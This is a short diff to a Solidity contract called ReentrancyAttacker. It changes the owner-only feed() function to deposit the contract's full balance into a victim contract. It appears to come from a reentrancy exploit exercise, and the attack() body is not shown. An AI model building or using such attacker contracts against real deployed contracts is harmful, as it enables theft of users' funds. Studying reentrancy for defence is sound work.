@@ -17,7 +17,9 @@ contract ReentrancyAttacker {
 
     function feed() external payable {
         require(msg.sender == owner, "Not owner");
-        victimContract.deposit{value: msg.value}();
+        uint256 contractBalance = address(this).balance;
+        require(contractBalance > 0, "No funds to deposit");
+        victimContract.deposit{value: contractBalance}();
     }
 
     function attack() external {
